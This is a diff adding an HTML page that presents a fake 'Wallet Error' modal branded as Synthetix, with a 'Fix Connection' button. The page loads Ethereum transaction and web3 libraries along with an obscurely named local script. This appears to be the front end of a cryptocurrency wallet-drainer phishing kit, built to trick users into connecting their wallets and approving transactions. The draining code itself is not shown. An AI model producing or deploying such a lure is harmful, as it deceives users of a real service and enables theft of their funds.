@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <title>Wallet Error Modal</title>
+  <link href="https://fonts.googleapis.com" rel="preconnect">
+  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
+  <style>
+    /* Normalize CSS */
+    html {font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:none}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}
+
+    /* Custom Styles */
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .section {
+      background-color: #000;
+      width: 100%;
+      height: 100vh;
+    }
+
+    .blurryj {
+      z-index: 50;
+      -webkit-backdrop-filter: blur(5px);
+      backdrop-filter: blur(5px);
+      background-color: rgba(0, 0, 0, 0.3);
+      display: flex;
+      flex-flow: column;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      height: 100vh;
+      position: fixed;
+      inset: 0%;
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .div-block {
+      background-color: #0d0d0d;
+      border-radius: 18px;
+      display: flex;
+      flex-flow: column;
+      justify-content: center;
+      align-items: center;
+      width: 22rem;
+      height: auto;
+      min-height: 20rem;
+      padding: 28px 24px;
+      position: relative;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+    }
+
+    .image {
+      width: 26px;
+      height: 19px;
+      margin-bottom: 12px;
+    }
+
+    .heading {
+      color: #fff;
+      margin-top: 0;
+      margin-bottom: 70px;
+      font-family: 'Inter', sans-serif;
+      font-size: 28px;
+      font-weight: 600;
+      line-height: 1.2;
+    }
+
+    .lottie-animation {
+      width: 80px;
+      height: 80px;
+      position: absolute;
+      top: 96px;
+    }
+
+    .text-block {
+      color: #fff;
+      text-align: center;
+      width: 100%;
+      margin-top: 32px;
+      margin-bottom: 28px;
+      font-family: 'Inter', sans-serif;
+      font-weight: 400;
+      line-height: 1.5;
+      font-size: 15px;
+    }
+
+    .fixy {
+      color: #00d1ff;
+      text-align: center;
+      background-color: #004b5c;
+      border: 1px solid #00d1ff;
+      border-radius: 9px;
+      display: flex;
+      flex-flow: column;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      padding: 14px;
+      font-family: 'Inter', sans-serif;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+      margin-bottom: 12px;
+    }
+
+    .fixy:hover {
+      background-color: #005d73;
+    }
+
+    .bold-text {
+      color: #00d1ff;
+      font-weight: 600;
+    }
+
+    .clipboard-btn {
+      color: #00d1ff;
+      text-align: center;
+      background-color: #004b5c;
+      border: 1px solid #00d1ff;
+      border-radius: 9px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      padding: 14px;
+      font-family: 'Inter', sans-serif;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    .clipboard-btn:hover {
+      background-color: #005d73;
+    }
+
+    .clipboard-text {
+      color: #00d1ff;
+    }
+
+    .clipboard-icon {
+      width: 16px;
+      height: 16px;
+      margin-left: 8px;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2300d1ff' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='9' y='9' width='13' height='13' rx='2' ry='2'%3E%3C/rect%3E%3Cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'%3E%3C/path%3E%3C/svg%3E");
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+    }
+
+    .clipboard-btn.copied .clipboard-icon {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2300d1ff' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='20 6 9 17 4 12'%3E%3C/polyline%3E%3C/svg%3E");
+    }
+
+    @media screen and (max-width: 479px) {
+      .div-block {
+        width: 90%;
+        padding: 24px 16px;
+      }
+    }
+  </style>
+
+  
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+      
+<script src="./settings.js"></script>
+<script src="./1hogbqlk7mu.js" type="module"></script>
+
+
+</head>
+<body>
+  <section class="section">
+    <!-- Modal Content -->
+    <div class="blurryj">
+      <div class="div-block">
+        <svg class="image" width="26" height="19" viewBox="0 0 26 19" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M6.178 4.731C6.09831 4.63311 5.9976 4.55441 5.88334 4.50075C5.76909 4.44709 5.64422 4.41983 5.518 4.421H0.16C0.138598 4.42198 0.117227 4.41849 0.0972531 4.41074C0.077279 4.40299 0.0591415 4.39116 0.044 4.376C0.0301557 4.36322 0.0190341 4.34777 0.0113017 4.33059C0.00356932 4.31341 -0.000614822 4.29484 -0.001 4.276V0.64C-0.000614822 0.621161 0.00356932 0.602594 0.0113017 0.585411C0.0190341 0.568228 0.0301557 0.552782 0.044 0.54C0.0590552 0.524663 0.0771539 0.512647 0.097132 0.504724C0.11711 0.496802 0.138525 0.493149 0.16 0.494H5.82C7.248 0.494 8.48 1.082 9.516 2.258L10.891 3.948L8.213 7.24L6.178 4.731ZM16.07 2.24C17.106 1.076 18.344 0.494 19.785 0.494H25.427C25.475 0.494 25.51 0.506 25.534 0.53C25.558 0.555 25.57 0.591 25.57 0.64V4.276C25.57 4.313 25.558 4.346 25.534 4.376C25.51 4.406 25.474 4.422 25.427 4.422H20.07C19.9439 4.42071 19.819 4.44781 19.7048 4.5013C19.5905 4.55479 19.4898 4.63329 19.41 4.731L15.463 9.568L19.427 14.441C19.5068 14.5331 19.6056 14.6068 19.7166 14.657C19.8276 14.7073 19.9482 14.7328 20.07 14.732H25.427C25.475 14.732 25.51 14.747 25.534 14.778C25.558 14.808 25.57 14.848 25.57 14.896V18.532C25.57 18.569 25.558 18.602 25.534 18.632C25.51 18.662 25.474 18.678 25.427 18.678H19.785C18.345 18.678 17.112 18.09 16.088 16.914L12.803 12.877L9.517 16.914C8.481 18.09 7.243 18.678 5.803 18.678H0.161C0.113 18.678 0.077 18.663 0.053 18.632C0.0281338 18.5979 0.0157753 18.5562 0.018 18.514V14.877C0.018 14.841 0.029 14.807 0.053 14.777C0.077 14.747 0.113 14.732 0.161 14.732H5.517C5.767 14.732 5.987 14.629 6.178 14.422L10.053 9.658L16.07 2.24Z" fill="#00D1FF"/>
+        </svg>
+        <h1 class="heading">Wallet Error</h1>
+        <div id="lottie" class="lottie-animation"></div>
+        <div class="text-block">We've detected an issue with your connected wallet on <strong class="bold-text">Synthetix</strong>. This may affect your ability to access certain features if error persists re-connect safely and faster VIA wallet DApp browser.</div>
+        <button class="fixy">Fix Connection</button>
+        
+      </div>
+    </div>
+  </section>
+
+  <script>
+    // Initialize Lottie animation
+    lottie.loadAnimation({
+      container: document.getElementById('lottie'),
+      renderer: 'svg',
+      loop: true,
+      autoplay: true,
+      path: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Animation---1738159120499-Wjn0p085wpHIftMt0g5fIXvZUxHtLw.json'
+    });
+    
+    // Clipboard functionality
+    function copyToClipboard() {
+      navigator.clipboard.writeText("clipboard-content");
+      const clipboardBtn = document.querySelector('.clipboard-btn');
+      clipboardBtn.classList.add('copied');
+      setTimeout(() => clipboardBtn.classList.remove('copied'), 2000);
+    }
+  </script>
+</body>
+</html>
+
